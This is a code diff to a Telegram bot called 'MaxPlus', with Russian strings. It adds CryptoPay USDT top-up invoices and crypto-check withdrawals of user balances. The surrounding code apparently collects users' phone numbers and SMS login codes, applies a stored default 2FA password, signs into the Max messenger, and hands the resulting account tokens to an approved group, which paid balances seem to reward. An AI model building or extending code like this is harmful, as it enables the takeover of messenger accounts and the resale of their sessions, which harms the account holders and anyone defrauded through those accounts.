@@ -6,6 +6,7 @@ from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command
 from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from pymax import Client, ExtraConfig, WebClient
+from aiocryptopay import CryptoPay, Networks
 
 # === Логирование ===
 logging.basicConfig(
@@ -23,6 +24,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
 DATABASE_URL = os.getenv("DATABASE_URL")
 DEFAULT_2FA_PASSWORD = os.getenv("PASS", "")
+CRYPTO_BOT_TOKEN = os.getenv("CRYPTO2", "")
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -30,6 +32,7 @@ pending = {}
 waiting_code = {}
 expecting_phone = set()
 db_pool = None
+crypto = CryptoPay(token=CRYPTO_BOT_TOKEN, network=Networks.TEST_NET) if CRYPTO_BOT_TOKEN else None
 
 # === TelegramSmsProvider ===
 class TelegramSmsProvider:
@@ -186,6 +189,7 @@ async def help_cmd(msg: Message):
         "📋 <b>Команды MaxPlus:</b>\n\n"
         "/get — Получить все токены и статистику\n"
         "/convert — Конвертировать токены в WEB\n"
+        "/pay — Пополнить казну бота\n"
         "/help — Показать эту справку\n\n"
         "<b>Как авторизоваться:</b>\n"
         "1. Отправь номер в личку боту\n"
@@ -273,6 +277,34 @@ async def get_tokens(msg: Message):
     await msg.answer_document(file, caption=text)
     logger.info(f"Group {msg.chat.id} — /get, токенов: {len(tokens)}")
 
+# === Пополнение казны ===
+@dp.message(Command("pay"))
+async def pay_cmd(msg: Message):
+    if not await is_approved_group(msg):
+        return
+    if not crypto:
+        return await msg.answer("❌ Платёжная система не настроена")
+
+    try:
+        amount = float(msg.text.split()[1])
+    except (IndexError, ValueError):
+        return await msg.answer("❌ Используй: /pay 5.00")
+
+    if amount <= 0:
+        return await msg.answer("❌ Сумма должна быть больше нуля")
+
+    try:
+        invoice = await crypto.create_invoice(
+            asset='USDT',
+            amount=amount,
+            description=f"Пополнение казны maxPLUS от {msg.from_user.id}"
+        )
+        await msg.answer(
+            f"📥 Ссылка на пополнение {amount:.2f} USDT:\n{invoice.bot_invoice_url}"
+        )
+    except Exception as e:
+        await msg.answer(f"❌ Ошибка создания счёта: {e}")
+
 # === Обработчики callback'ов ===
 
 @dp.callback_query(lambda c: c.data == "profile")
@@ -304,7 +336,28 @@ async def back_to_start_callback(callback: CallbackQuery):
 
 @dp.callback_query(lambda c: c.data == "withdraw")
 async def withdraw_callback(callback: CallbackQuery):
-    await callback.answer("💰 Вывод средств", show_alert=True)
+    user_id = callback.from_user.id
+    balance = await get_user_balance(user_id)
+
+    if balance < 1.0:
+        await callback.answer("💰 Недостаточно средств. Минимальная сумма вывода — $1.00", show_alert=True)
+        return
+
+    if not crypto:
+        await callback.answer("❌ Платёжная система не настроена", show_alert=True)
+        return
+
+    try:
+        check = await crypto.create_check(asset='USDT', amount=balance)
+        await add_to_balance(user_id, -balance)
+        await callback.message.answer(
+            f"💳 Чек на вывод {balance:.2f} USDT:\n{check.bot_check_url}"
+        )
+    except Exception:
+        await callback.message.answer(
+            "📲 Казна бота еще не пополнена на сумму вашего вывода, подождите или свяжитесь с менеджером."
+        )
+    await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "faq")
 async def faq_callback(callback: CallbackQuery):
@@ -435,7 +488,6 @@ async def phone_handler(msg: Message):
     raw = msg.text.strip()
     digits = "".join(c for c in raw if c.isdigit())
 
-    # Если это номер — всегда обрабатываем
     is_phone = len(digits) in (10, 11) and (digits.startswith("7") or digits.startswith("8"))
 
     if is_phone and msg.from_user.id in expecting_phone:
@@ -476,7 +528,6 @@ async def phone_handler(msg: Message):
         asyncio.create_task(code_timeout(msg.from_user.id, phone))
         return
 
-    # Если это код ответом на инструкцию
     if msg.from_user.id in waiting_code:
         if msg.reply_to_message and msg.reply_to_message.from_user.id == bot.id:
             return await code_as_reply(msg)
@@ -484,11 +535,9 @@ async def phone_handler(msg: Message):
             "❌ Неверный формат ввода. Пожалуйста, введите код ответом на сообщение бота с инструкцией"
         )
 
-    # Если не в режиме ожидания
     if msg.from_user.id not in expecting_phone:
         return
 
-    # Всё остальное — ошибка
     await msg.answer("❌ Не удалось распознать номер. Отправьте в формате +79161234567")
 
 async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
